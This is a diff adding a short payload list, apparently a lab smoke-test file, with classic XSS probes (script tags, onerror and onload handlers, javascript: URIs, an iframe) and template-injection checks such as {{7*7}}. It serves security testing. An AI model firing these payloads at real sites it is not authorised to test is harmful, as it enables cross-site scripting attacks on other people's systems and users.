@@ -1,0 +1,13 @@
+# lab — XSS / HTML reflection smoke (кураторский KDT; не SecLists)
+<script>alert(1)</script>
+"><img src=x onerror=alert(1)>
+'"><svg/onload=alert(1)>
+"><b>kdt</b>
+javascript:alert(1)
+<img src=x>
+"><svg><script>alert(1)</script>
+' onfocus=alert(1) autofocus='
+"><iframe src=javascript:alert(1)>
+{{7*7}}
+${7*7}
+kdt\"xss
